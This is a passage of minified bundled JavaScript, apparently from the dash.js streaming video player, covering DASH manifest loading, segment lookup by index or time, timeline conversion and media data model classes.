x,z=(m(x={},g.default.MPD,[g.default.ID,g.default.PROFILES]),m(x,g.default.PERIOD,[g.default.ID]),m(x,g.default.BASE_URL,[g.default.SERVICE_LOCATION,g.default.BYTE_RANGE]),m(x,g.default.SEGMENT_BASE,[g.default.INDEX_RANGE]),m(x,g.default.INITIALIZATION,[g.default.RANGE]),m(x,g.default.REPRESENTATION_INDEX,[g.default.RANGE]),m(x,g.default.SEGMENT_LIST,[g.default.INDEX_RANGE]),m(x,g.default.BITSTREAM_SWITCHING,[g.default.RANGE]),m(x,g.default.SEGMENT_URL,[g.default.MEDIA_RANGE,g.default.INDEX_RANGE]),m(x,g.default.SEGMENT_TEMPLATE,[g.default.INDEX_RANGE,g.default.MEDIA,g.default.INDEX,g.default.INITIALIZATION_MINUS,g.default.BITSTREAM_SWITCHING_MINUS]),m(x,g.default.ASSET_IDENTIFIER,[g.default.VALUE,g.default.ID]),m(x,g.default.EVENT_STREAM,[g.default.VALUE]),m(x,g.default.ADAPTATION_SET,[g.default.PROFILES,g.default.MIME_TYPE,g.default.SEGMENT_PROFILES,g.default.CODECS,g.default.CONTENT_TYPE]),m(x,g.default.FRAME_PACKING,[g.default.VALUE,g.default.ID]),m(x,g.default.AUDIO_CHANNEL_CONFIGURATION,[g.default.VALUE,g.default.ID]),m(x,g.default.CONTENT_PROTECTION,[g.default.VALUE,g.default.ID]),m(x,g.default.ESSENTIAL_PROPERTY,[g.default.VALUE,g.default.ID]),m(x,g.default.SUPPLEMENTAL_PROPERTY,[g.default.VALUE,g.default.ID]),m(x,g.default.INBAND_EVENT_STREAM,[g.default.VALUE,g.default.ID]),m(x,g.default.ACCESSIBILITY,[g.default.VALUE,g.default.ID]),m(x,g.default.ROLE,[g.default.VALUE,g.default.ID]),m(x,g.default.RATING,[g.default.VALUE,g.default.ID]),m(x,g.default.VIEWPOINT,[g.default.VALUE,g.default.ID]),m(x,g.default.CONTENT_COMPONENT,[g.default.CONTENT_TYPE]),m(x,g.default.REPRESENTATION,[g.default.ID,g.default.DEPENDENCY_ID,g.default.MEDIA_STREAM_STRUCTURE_ID]),m(x,g.default.SUBSET,[g.default.ID]),m(x,g.default.METRICS,[g.default.METRICS_MINUS]),m(x,g.default.REPORTING,[g.default.VALUE,g.default.ID]),x);return!!z.hasOwnProperty(r)&&void 0!==(r=z[r])&&0<=r.indexOf(t.name)}),(function(t){return String(t)}))}Object.defineProperty(M,"__esModule",{value:!0});var l=function(t,r,x){for(var z=!0;z;){if(null===t&&(t=Function.prototype),void 0!==(z=Object.getOwnPropertyDescriptor(t,r))){if("value"in z)return z.value;if(void 0===(r=z.get))break;return r.call(x)}if(null===(t=Object.getPrototypeOf(t)))break;z=!0}},f=v(u(71)),g=v(u(61));(function(t,r){if("function"!=typeof r&&null!==r)throw new TypeError("Super expression must either be null or a function, not "+typeof r);t.prototype=Object.create(r&&r.prototype,{constructor:{value:t,enumerable:!1,writable:!0,configurable:!0}}),r&&(Object.setPrototypeOf?Object.setPrototypeOf(t,r):t.__proto__=r)})(p,f.default),u=p,M.default=u,da.exports=M.default},{61:61,71:71}],76:[function(u,da,M){function v(p){function l(f,g){for(var t=0,r=f.children.length;t<r;++t){var x=f.children[t],z=g[x.name+"_asArray"];if(z)for(var J=0,E=z.length;J<E;++J){for(var D=z[J],I=f.properties,L=g,G=D,N=0,w=I.length;N<w;++N){var h=I[N];if(L[h.name])if(G[h.name]){if(h.merge){var F=L[h.name],P=G[h.name];if("object"==typeof F&&"object"==typeof P)for(h in h=void 0,F)P.hasOwnProperty(h)||(P[h]=F[h]);else G[h.name]=F+P}}else G[h.name]=L[h.name]}l(x,D)}}}return{run:function(f){if(null===f||"object"!=typeof f)return f;if("period"in p)for(var g=p.period,t=f.Period_asArray,r=0,x=t.length;r<x;++r){var z=t[r];if(l(g,z),"adaptationset"in p&&(z=z.AdaptationSet_asArray))for(var J=p.adaptationset,E=0,D=z.length;E<D;++E)l(J,z[E])}return f}}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="ObjectIron",m=u.default.getClassFactory(v),M.default=m,da.exports=M.default},{47:47}],77:[function(u,da,M){function v(g){return g&&g.__esModule?g:{default:g}}function m(g,t){function r(){if(!z||!z.hasOwnProperty("calcPeriodRelativeTimeFromMpdRelativeTime"))throw Error(l.default.MISSING_CONFIG_ERROR)}function x(J,E){if(r(),!J)return null;var D,I=J.adaptation.period.mpd.manifest.Period_asArray[J.adaptation.period.index].AdaptationSet_asArray[J.adaptation.index].Representation_asArray[J.index].SegmentList,L=I.SegmentURL_asArray.length,G=J.startNumber,N=null;return E<L&&(D=I.SegmentURL_asArray[E],(N=(0,f.getIndexBasedSegment)(z,t,J,E))&&(N.replacementTime=(G+E-1)*J.segmentDuration,N.media=D.media?D.media:"",N.mediaRange=D.mediaRange,N.index=E,N.indexRange=D.indexRange)),J.availableSegmentsNumber=L,N}var z=(g=g||{}).timelineConverter;return{getSegmentByIndex:x,getSegmentByTime:function(J,E){if(r(),!J)return null;var D=J.segmentDuration;return isNaN(D)?null:(E=z.calcPeriodRelativeTimeFromMpdRelativeTime(J,E),x(J,Math.floor(E/D)))}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(108)),f=u(80);m.__dashjs_factory_name="ListSegmentsGetter",u=p.default.getClassFactory(m),M.default=u,da.exports=M.default},{108:108,47:47,80:80}],78:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function")}var p,f;Object.defineProperty(M,"__esModule",{value:!0}),p=m,f=[{key:"round10",value:function(p,l){return f="round",g=p,void 0!==(t=l)&&0!=+t?(t=+t,null===(g=+g)||isNaN(g)||"number"!=typeof t||0!=t%1?NaN:(g=g.toString().split("e"),+((g=(g=Math[f](+(g[0]+"e"+(g[1]?g[1]-t:-t)))).toString().split("e"))[0]+"e"+(g[1]?+g[1]+t:t)))):Math[f](g);var f,g,t}}],f&&v(p,f),u=m,M.default=u,da.exports=M.default},{}],79:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(f){function g(){if(!r||!r.hasOwnProperty("calcPeriodRelativeTimeFromMpdRelativeTime"))throw Error(l.default.MISSING_CONFIG_ERROR)}function t(x,z){if(g(),!x)return null;var J=x.segments?x.segments.length:-1,E=void 0;if(z<J&&(E=x.segments[z])&&E.availabilityIdx===z)return E;for(var D=0;D<J;D++)if((E=x.segments[D])&&E.availabilityIdx===z)return E;return null}var r=(f=f||{}).timelineConverter;return{getSegmentByIndex:t,getSegmentByTime:function(x,z){if(g(),z=r.calcPeriodRelativeTimeFromMpdRelativeTime(x,z),x){var w,J=x.segments,E=J?J.length:null,D=-1,I=void 0,L=void 0,G=void 0,N=void 0;if(J&&0<E)for(w=0;w<E;w++)if((G=(L=J[w]).presentationStartTime)<=z+(I=(N=L.duration)/2)&&z-I<G+N){D=L.availabilityIdx;break}z=D}else z=-1;return t(x,z)}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(108));m.__dashjs_factory_name="SegmentBaseGetter",u=p.default.getClassFactory(m),M.default=u,da.exports=M.default},{108:108,47:47}],80:[function(u,da,M){function v(t,r){for(;t.length<r;)t="0"+t;return t}function m(t,r,x){var z,J,I,E=void 0,D=void 0,L=r.length;if(!t)return t;for(;;){if(0>(z=t.indexOf("$"+r))||0>(J=t.indexOf("$",z+L)))return t;if(z<(E=t.indexOf("%0",z+L))&&E<J)switch(D=t.charAt(J-1),I=parseInt(t.substring(E+2,J-1),10),D){case"d":case"i":case"u":I=v(x.toString(),I);break;case"x":I=v(x.toString(16),I);break;case"X":I=v(x.toString(16),I).toUpperCase();break;case"o":I=v(x.toString(8),I);break;default:return t}else I=x;t=t.substring(0,z)+I+t.substring(J+1)}}function p(t,r,x,z,J,E,D,I,L){var G=new g.default;return G.representation=t,G.duration=r,G.presentationStartTime=x,G.mediaStartTime=z,G.availabilityStartTime=J,G.availabilityEndTime=E.calcAvailabilityEndTimeFromPresentationTime(D,t.adaptation.period.mpd,I),G.wallStartTime=E.calcWallTimeForSegment(G,I),G.replacementNumber=G.representation.startNumber+L,G.availabilityIdx=L,G}function l(t,r,x,z){var J=t.getPeriodEnd(r,z);if(!(t.calcPeriodRelativeTimeFromMpdRelativeTime(r,J)<=t.calcPeriodRelativeTimeFromMpdRelativeTime(r,x.presentationStartTime)&&(!z||r.segmentAvailabilityRange&&x.presentationStartTime>=r.segmentAvailabilityRange.end)))return 1}Object.defineProperty(M,"__esModule",{value:!0}),M.unescapeDollarsInTemplate=function(t){return t?t.split("$$").join("$"):t},M.replaceIDForTemplate=function(t,r){return r&&t&&-1!==t.indexOf("$RepresentationID$")?(r=r.toString(),t.split("$RepresentationID$").join(r)):t},M.replaceTokenForTemplate=m,M.getIndexBasedSegment=function(t,r,x,z){var J=x.segmentDuration;isNaN(J)&&(J=x.adaptation.period.duration);var E=parseFloat((x.adaptation.period.start+z*J).toFixed(5)),D=parseFloat((E+J).toFixed(5));return z=p(x,J,E,t.calcMediaTimeFromPresentationTime(E,x),t.calcAvailabilityStartTimeFromPresentationTime(E,x.adaptation.period.mpd,r),t,D,r,z),l(t,x,z,r)?z:null},M.getTimeBasedSegment=function(t,r,x,z,J,E,D,I,L,G){var N,w,h=z/E;return J=Math.min(J/E,x.adaptation.period.mpd.maxSegmentDuration),E=void 0,w=(N=t.calcPresentationTimeFromMediaTime(h,x))+J,l(t,x,E=p(x,J,N,h,x.adaptation.period.mpd.manifest.loadedTime,t,w,r,L),r)?(E.replacementTime=G||z,D=m(D,"Number",E.replacementNumber),D=m(D,"Time",E.replacementTime),E.media=D,E.mediaRange=I,E):null};var f,g=(f=u(94))&&f.__esModule?f:{default:f}},{94:94}],81:[function(u,da,M){function v(g){return g&&g.__esModule?g:{default:g}}function m(g,t){function r(){if(!z||!z.hasOwnProperty("calcPeriodRelativeTimeFromMpdRelativeTime"))throw Error(l.default.MISSING_CONFIG_ERROR)}function x(J,E){if(r(),!J)return null;var D=J.adaptation.period.mpd.manifest.Period_asArray[J.adaptation.period.index].AdaptationSet_asArray[J.adaptation.index].Representation_asArray[J.index].SegmentTemplate;E=Math.max(E,0);var I,L=(0,f.getIndexBasedSegment)(z,t,J,E);return L&&(L.replacementTime=(E-1)*J.segmentDuration,I=D.media,I=(0,f.replaceTokenForTemplate)(I,"Number",L.replacementNumber),I=(0,f.replaceTokenForTemplate)(I,"Time",L.replacementTime),L.media=I),E=J.segmentDuration,D=J.segmentAvailabilityRange,isNaN(E)?J.availableSegmentsNumber=1:J.availableSegmentsNumber=Math.ceil((D.end-D.start)/E),L}var z=(g=g||{}).timelineConverter;return{getSegmentByIndex:x,getSegmentByTime:function(J,E){if(r(),!J)return null;var D=J.segmentDuration;return isNaN(D)?null:(E=z.calcPeriodRelativeTimeFromMpdRelativeTime(J,E),x(J,Math.floor(E/D)))}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(108)),f=u(80);m.__dashjs_factory_name="TemplateSegmentsGetter",u=p.default.getClassFactory(m),M.default=u,da.exports=M.default},{108:108,47:47,80:80}],82:[function(u,da,M){function v(r){return r&&r.__esModule?r:{default:r}}function m(){function r(h,F,P,O){return O?P&&F.timeShiftBufferDepth!=Number.POSITIVE_INFINITY?new Date(F.availabilityStartTime.getTime()+1e3*(h+F.timeShiftBufferDepth)):F.availabilityEndTime:P?new Date(F.availabilityStartTime.getTime()+1e3*(h-G)):F.availabilityStartTime}function x(h,F){return(h.getTime()-F.mpd.availabilityStartTime.getTime()+1e3*G)/1e3}function z(h){N||void 0===h.offset||(G=h.offset/1e3,N=!0)}function J(){I.off(l.default.TIME_SYNCHRONIZATION_COMPLETED,z,this),G=0,N=!1,w=NaN}var E,D=this.context,I=(0,p.default)(D).getInstance(),L=void 0,G=void 0,N=void 0,w=void 0;return E={initialize:function(){G=0,N=!1,w=NaN,I.on(l.default.TIME_SYNCHRONIZATION_COMPLETED,z,this)},isTimeSyncCompleted:function(){return N},setTimeSyncCompleted:function(h){N=h},getClientTimeOffset:function(){return G},setClientTimeOffset:function(h){G=h},getExpectedLiveEdge:function(){return w},setExpectedLiveEdge:function(h){w=h},calcAvailabilityStartTimeFromPresentationTime:function(h,F,P){return r.call(this,h,F,P)},calcAvailabilityEndTimeFromPresentationTime:function(h,F,P){return r.call(this,h,F,P,!0)},calcPresentationTimeFromWallTime:x,calcPresentationTimeFromMediaTime:function(h,F){return h+(F.adaptation.period.start-F.presentationTimeOffset)},calcPeriodRelativeTimeFromMpdRelativeTime:function(h,F){return F-h.adaptation.period.start},calcMediaTimeFromPresentationTime:function(h,F){return h-F.adaptation.period.start+F.presentationTimeOffset},calcSegmentAvailabilityRange:function(h,F){var P=h.adaptation.period,O={start:P.start,end:P.start+P.duration};if(!F)return O;if(!N&&h.segmentAvailabilityRange)return h.segmentAvailabilityRange;var R=h.segmentDuration||(h.segments&&h.segments.length?h.segments[h.segments.length-1].duration:0);if(h.segmentInfoType===g.default.SEGMENT_TIMELINE&&P.mpd.timeShiftBufferDepth===Number.POSITIVE_INFINITY){O=(h=L.getRepresentationFor(h.index,h.adaptation.period.mpd.manifest.Period_asArray[h.adaptation.period.index].AdaptationSet_asArray[h.adaptation.index])).SegmentTemplate.timescale,P=h.SegmentTemplate.SegmentTimeline.S_asArray;var Q=0;(F={start:0,end:0}).start=P[0].t/O;var ja=0;for(h=P.length;ja<h;ja++){var W=0;(R=P[ja]).hasOwnProperty("r")&&(W=R.r),Q+=R.d/O*(1+W)}return F.end=F.start+Q,F}return F=x(new Date,P),Q=P.start+P.duration,O.start=Math.max(F-P.mpd.timeShiftBufferDepth,P.start),h=void 0!==h.availabilityTimeOffset&&h.availabilityTimeOffset<R?R-h.availabilityTimeOffset:R,O.end=Q<=F&&F-h<Q?Q:F-h,O},getPeriodEnd:function(h,F){var P=h.adaptation.period;if(!F)return P.start+P.duration;if(!N&&h.segmentAvailabilityRange)return h.segmentAvailabilityRange;F=h.segmentDuration||(h.segments&&h.segments.length?h.segments[h.segments.length-1].duration:0);var O=x(new Date,P);return Math.min(O-(void 0!==h.availabilityTimeOffset&&h.availabilityTimeOffset<F?F-h.availabilityTimeOffset:F),P.start+P.duration)},calcWallTimeForSegment:function(h,F){var P=void 0,O=void 0,R=void 0;return F&&(P=h.representation.adaptation.period.mpd.suggestedPresentationDelay,O=h.presentationStartTime+P,R=new Date(h.availabilityStartTime.getTime()+1e3*O)),R},reset:J},L=(0,t.default)(D).getInstance(),J(),E}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(46)),l=v(u(54)),f=v(u(47)),g=v(u(61)),t=v(u(65));m.__dashjs_factory_name="TimelineConverter",M.default=f.default.getSingletonFactory(m),da.exports=M.default},{46:46,47:47,54:54,61:61,65:65}],83:[function(u,da,M){function v(g){return g&&g.__esModule?g:{default:g}}function m(g,t){function r(){if(!z||!z.hasOwnProperty("calcMediaTimeFromPresentationTime")||!z.hasOwnProperty("calcSegmentAvailabilityRange"))throw Error(l.default.MISSING_CONFIG_ERROR)}function x(J,E){for(var F,D=J.adaptation.period.mpd.manifest.Period_asArray[J.adaptation.period.index].AdaptationSet_asArray[J.adaptation.index].Representation_asArray[J.index].SegmentTemplate||J.adaptation.period.mpd.manifest.Period_asArray[J.adaptation.period.index].AdaptationSet_asArray[J.adaptation.index].Representation_asArray[J.index].SegmentList,I=D.SegmentTimeline,L=D.SegmentURL_asArray,G=0,N=0,w=-1,h=void 0,P=void 0,O=void 0,R=J.timescale,Q=!1,ja=0,W=(I=I.S_asArray).length;ja<W&&!Q;ja++){var aa,ma=0;for((h=I[ja]).hasOwnProperty("r")&&(ma=h.r),h.hasOwnProperty("t")&&(N=(G=h.t)/R),0>ma&&((O=I[ja+1])&&O.hasOwnProperty("t")?P=O.t/R:(aa=J.segmentAvailabilityRange?J.segmentAvailabilityRange.end:z.calcSegmentAvailabilityRange(J,t).end,P=z.calcMediaTimeFromPresentationTime(aa,J),J.segmentDuration=h.d/R),ma=Math.ceil((P-N)/(h.d/R))-1),F=0;F<=ma&&!Q;F++)(Q=E(G,N,D,L,h,R,++w,ja))&&(J.segmentDuration=h.d/R,(F<ma-1||ja<W-1)&&w++),N=(G+=h.d)/R}J.availableSegmentsNumber=w}var z=(g=g||{}).timelineConverter;return{getSegmentByIndex:function(J,E,D){if(r(),!J)return null;var I=null,L=!1;return x(J,(function(G,N,w,h,F,P,O,R){return L||0>D?(N=w.media,w=F.mediaRange,h&&(N=h[R].media||"",w=h[R].mediaRange),I=(0,f.getTimeBasedSegment)(z,t,J,G,F.d,P,N,w,O,F.tManifest),!0):(N>=D-.5*F.d/P&&(L=!0),!1)})),I},getSegmentByTime:function(J,E){if(r(),!J)return null;void 0===E&&(E=null);var D=null,I=z.calcMediaTimeFromPresentationTime(E,J);return x(J,(function(L,G,N,w,h,F,P,O){return I<G+h.d/F&&(G=N.media,N=h.mediaRange,w&&(G=w[O].media||"",N=w[O].mediaRange),D=(0,f.getTimeBasedSegment)(z,t,J,L,h.d,F,G,N,P,h.tManifest),!0)})),D}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(108)),f=u(80);m.__dashjs_factory_name="TimelineSegmentsGetter",u=p.default.getClassFactory(m),M.default=u,da.exports=M.default},{108:108,47:47,80:80}],84:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.period=null,this.index=-1,this.type=null},da.exports=M.default},{}],85:[function(u,da,M){function v(m,p,l,f){if(!(this instanceof v))throw new TypeError("Cannot call a class as a function");this.url=m||"",this.serviceLocation=p||m||"",this.dvb_priority=l||1,this.dvb_weight=f||1,this.availabilityTimeOffset=0,this.availabilityTimeComplete=!0}Object.defineProperty(M,"__esModule",{value:!0}),v.DEFAULT_DVB_PRIORITY=1,v.DEFAULT_DVB_WEIGHT=1,M.default=v,da.exports=M.default},{}],86:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.id=this.presentationTime=this.duration=NaN,this.messageData="",this.eventStream=null,this.presentationTimeDelta=NaN},da.exports=M.default},{}],87:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.period=this.representation=this.adaptionSet=null,this.timescale=1,this.schemeIdUri=this.value=""},da.exports=M.default},{}],88:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.DVRWindowSize=NaN,this.availableFrom=this.loadedTime=null,this.duration=this.minBufferTime=NaN,this.isDynamic=!1,this.maxFragmentDuration=null},da.exports=M.default},{}],89:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.streamInfo=this.type=this.index=this.id=null,this.representationCount=0,this.contentProtection=this.mimeType=this.codec=this.roles=this.audioChannelConfiguration=this.accessibility=this.viewpoint=this.lang=null,this.isText=!1,this.bitrateList=this.KID=null}var p,l;Object.defineProperty(M,"__esModule",{value:!0}),p=m,l=[{key:"isMediaInfoEqual",value:function(p){if(!p)return!1;var l=this.viewpoint===p.viewpoint,f=this.lang===p.lang,g=this.roles.toString()===p.roles.toString(),t=this.accessibility.toString()===p.accessibility.toString(),r=this.audioChannelConfiguration.toString()===p.audioChannelConfiguration.toString();return this.id===p.id&&l&&f&&g&&t&&r}}],l&&v(p.prototype,l),u=m,M.default=u,da.exports=M.default},{}],90:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.manifest=null,this.suggestedPresentationDelay=0,this.availabilityStartTime=null,this.maxSegmentDuration=this.timeShiftBufferDepth=this.availabilityEndTime=Number.POSITIVE_INFINITY,this.mediaPresentationDuration=this.minimumUpdatePeriod=NaN},da.exports=M.default},{}],91:[function(u,da,M){function v(){if(!(this instanceof v))throw new TypeError("Cannot call a class as a function");this.id=null,this.index=-1,this.start=this.duration=NaN,this.mpd=null}Object.defineProperty(M,"__esModule",{value:!0}),v.DEFAULT_ID="defaultId",M.default=v,da.exports=M.default},{}],92:[function(u,da,M){function v(f,g){for(var t=0;t<g.length;t++){var r=g[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(f,r.key,r)}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.id=null,this.index=-1,this.codecPrivateData=this.codecs=this.initialization=this.segmentInfoType=this.adaptation=null,this.segmentDuration=NaN,this.startNumber=this.timescale=1,this.range=this.indexRange=null,this.presentationTimeOffset=0,this.MSETimeOffset=NaN,this.segmentAvailabilityRange=null,this.availableSegmentsNumber=0,this.height=this.width=this.bandwidth=NaN,this.scanType=null,this.maxPlayoutRate=NaN,this.availabilityTimeOffset=0,this.availabilityTimeComplete=!0}Object.defineProperty(M,"__esModule",{value:!0});var p,f,g,l=(p=u(61))&&p.__esModule?p:{default:p};f=m,(g=[{key:"hasInitialization",value:function(){return null!==this.initialization||null!==this.range}},{key:"hasSegments",value:function(){return this.segmentInfoType!==l.default.BASE_URL&&this.segmentInfoType!==l.default.SEGMENT_BASE&&!this.indexRange}}])&&v(f.prototype,g),u=m,M.default=u,da.exports=M.default},{61:61}],93:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.MSETimeOffset=this.mediaInfo=this.fragmentDuration=this.DVRWindow=this.quality=this.id=null},da.exports=M.default},{}],94:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.media=this.mediaRange=this.index=this.indexRange=null,this.duration=NaN,this.replacementTime=null,this.wallStartTime=this.availabilityIdx=this.availabilityEndTime=this.availabilityStartTime=this.presentationStartTime=this.mediaStartTime=this.replacementNumber=NaN,this.representation=null},da.exports=M.default},{}],95:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.index=this.id=null,this.duration=this.start=NaN,this.manifestInfo=null,this.isLast=!0},da.exports=M.default},{}],96:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.value=this.schemeIdUri=""},da.exports=M.default},{}],97:[function(u,da,M){function v(t){return t&&t.__esModule?t:{default:t}}function m(t){t=t||{};var r=this.context,x=t.eventBus,z=t.events,J=t.urlUtils,E=t.errors,D=void 0,I=void 0;return D={checkForExistence:function(L){function G(w){x.trigger(z.CHECK_FOR_EXISTENCE_COMPLETED,{request:L,exists:w})}var N;L?(N=new f.default(L.url),I.load({request:N,success:function(){G(!0)},error:function(){G(!1)}})):G(!1)},load:function(L){function G(N,w){x.trigger(z.LOADING_COMPLETED,{request:L,response:N||null,error:w||null,sender:D})}L?I.load({request:L,progress:function(N){x.trigger(z.LOADING_PROGRESS,{request:L,stream:N.stream}),N.data&&x.trigger(z.LOADING_DATA_PROGRESS,{request:L,response:N.data||null,error:null,sender:D})},success:function(N){G(N)},error:function(N,w,h){G(void 0,new g.default(E.FRAGMENT_LOADER_LOADING_FAILURE_ERROR_CODE,h,w))},abort:function(N){N&&x.trigger(z.LOADING_ABANDONED,{request:N,mediaType:N.mediaType,sender:D})}}):G(void 0,new g.default(E.FRAGMENT_LOADER_NULL_REQUEST_ERROR_CODE,E.FRAGMENT_LOADER_NULL_REQUEST_ERROR_MESSAGE))},abort:function(){I&&I.abort()},reset:function(){I&&(I.abort(),I=null)}},I=(0,l.default)(r).create({errHandler:t.errHandler,errors:E,dashMetrics:t.dashMetrics,mediaPlayerModel:t.mediaPlayerModel,requestModifier:t.requestModifier,useFetch:t.settings.get().streaming.lowLatencyEnabled,urlUtils:J,constants:p.default,boxParser:t.boxParser,dashConstants:t.dashConstants}),D}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(158)),f=v(u(228)),g=v(u(225));u=v(u(47)),m.__dashjs_factory_name="FragmentLoader",M.default=u.default.getClassFactory(m),da.exports=M.default},{108:108,158:158,225:225,228:228,47:47}],98:[function(u,da,M){function v(G){return G&&G.__esModule?G:{default:G}}function m(G){function N(H){F.trigger(E.default.INTERNAL_MANIFEST_LOADED,{manifest:H.manifest})}G=G||{};var w=this.context,h=G.debug,F=(0,J.default)(w).getInstance(),P=(0,t.default)(w).getInstance(),O=void 0,R=void 0,Q=void 0,ja=void 0,W=void 0,aa=G.mssHandler,ma=G.errHandler;return O={load:function(H){var B=new r.default(H,z.HTTPRequest.MPD_TYPE);Q.load({request:B,success:function(A,Y,Z){if(ja){var na,T=Y=void 0,pa=void 0;if(Z&&Z!==H?(T=P.parseBaseUrl(Z),Y=Z):(P.isRelative(H)&&(H=P.resolve(H,wa.location.href)),T=P.parseBaseUrl(H)),null===W&&(na=null,W=-1<A.indexOf("SmoothStreamingMedia")?(aa&&(na=aa.createMssParser(),aa.registerEvents()),na):-1<A.indexOf("MPD")?(0,L.default)(w).create({debug:h}):na),null!==W){ja.setMatchers(W.getMatchers()),ja.setIron(W.getIron());try{pa=W.parse(A)}catch(ia){return void F.trigger(E.default.INTERNAL_MANIFEST_LOADED,{manifest:null,error:new x.default(D.default.MANIFEST_LOADER_PARSING_FAILURE_ERROR_CODE,D.default.MANIFEST_LOADER_PARSING_FAILURE_ERROR_MESSAGE+""+H)})}pa?(pa.url=Y||H,pa.originalUrl||(pa.originalUrl=pa.url),pa.hasOwnProperty(p.default.LOCATION)&&(T=P.parseBaseUrl(pa.Location_asArray[0]),R.debug("BaseURI set by Location to: "+T)),pa.baseUri=T,pa.loadedTime=new Date,ja.resolveManifestOnLoad(pa),F.trigger(E.default.ORIGINAL_MANIFEST_LOADED,{originalManifest:A})):F.trigger(E.default.INTERNAL_MANIFEST_LOADED,{manifest:null,error:new x.default(D.default.MANIFEST_LOADER_PARSING_FAILURE_ERROR_CODE,D.default.MANIFEST_LOADER_PARSING_FAILURE_ERROR_MESSAGE+""+H)})}else F.trigger(E.default.INTERNAL_MANIFEST_LOADED,{manifest:null,error:new x.default(D.default.MANIFEST_LOADER_PARSING_FAILURE_ERROR_CODE,D.default.MANIFEST_LOADER_PARSING_FAILURE_ERROR_MESSAGE+""+H)})}},error:function(A,Y,Z){F.trigger(E.default.INTERNAL_MANIFEST_LOADED,{manifest:null,error:new x.default(D.default.MANIFEST_LOADER_LOADING_FAILURE_ERROR_CODE,D.default.MANIFEST_LOADER_LOADING_FAILURE_ERROR_MESSAGE+(H+", ")+Z)})}})},reset:function(){F.off(E.default.XLINK_READY,N,O),ja&&(ja.reset(),ja=null),Q&&(Q.abort(),Q=null),aa&&aa.reset()}},R=h.getLogger(O),F.on(E.default.XLINK_READY,N,O),Q=(0,g.default)(w).create({errHandler:G.errHandler,dashMetrics:G.dashMetrics,mediaPlayerModel:G.mediaPlayerModel,requestModifier:G.requestModifier,useFetch:G.settings.get().streaming.lowLatencyEnabled,urlUtils:P,constants:p.default,dashConstants:l.default,errors:D.default}),ja=(0,f.default)(w).create({errHandler:ma,dashMetrics:G.dashMetrics,mediaPlayerModel:G.mediaPlayerModel,requestModifier:G.requestModifier,settings:G.settings}),W=null,O}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(61)),f=v(u(123)),g=v(u(158)),t=v(u(220)),r=v(u(232)),x=v(u(225)),z=u(241),J=v(u(46)),E=v(u(54)),D=v(u(51)),I=v(u(47)),L=v(u(66));m.__dashjs_factory_name="ManifestLoader",u=I.default.getClassFactory(m),M.default=u,da.exports=M.default},{108:108,123:123,158:158,220:220,225:225,232:232,241:241,46:46,47:47,51:51,54:54,61:61,66:66}],99:[function(u,da,M){function v(x){return x&&x.__esModule?x:{default:x}}function m(){function x(){null!==R&&(clearTimeout(R),R=null)}function z(A){x(),isNaN(A)&&!isNaN(O)&&(A=1e3*O),isNaN(A)||(P.debug("Refresh manifest in "+A+" milliseconds."),R=setTimeout(D,A))}function J(){ja=!0;var A=aa.getValue(),Y=A.url;(A=ma.getLocation(A))&&(Y=A),W.load(Y)}function E(A){var Y,Z;aa.getValue()&&aa.getValue().type===r.default.DYNAMIC&&A.type===r.default.STATIC?h.trigger(l.default.DYNAMIC_STREAM_COMPLETED):(aa.setValue(A),Z=((Y=new Date).getTime()-A.loadedTime.getTime())/1e3,2147483647<1e3*(O=ma.getManifestUpdatePeriod(A,Z))&&(O=2147483.647),h.trigger(l.default.MANIFEST_UPDATED,{manifest:A}),P.info("Manifest has been refreshed at "+Y+"["+Y.getTime()/1e3+"] "),Q||z())}function D(){Q&&!B.get().streaming.scheduleWhilePaused||(ja?z(B.get().streaming.manifestUpdateRetryInterval):J())}function I(A){A.error?A.error.code===t.default.MANIFEST_LOADER_PARSING_FAILURE_ERROR_CODE&&H.error(A.error):E(A.manifest)}function L(){Q=!1,z()}function G(){Q=!0,x()}function N(){ja=!1}var F,w=this.context,h=(0,p.default)(w).getInstance(),P=void 0,O=void 0,R=void 0,Q=void 0,ja=void 0,W=void 0,aa=void 0,ma=void 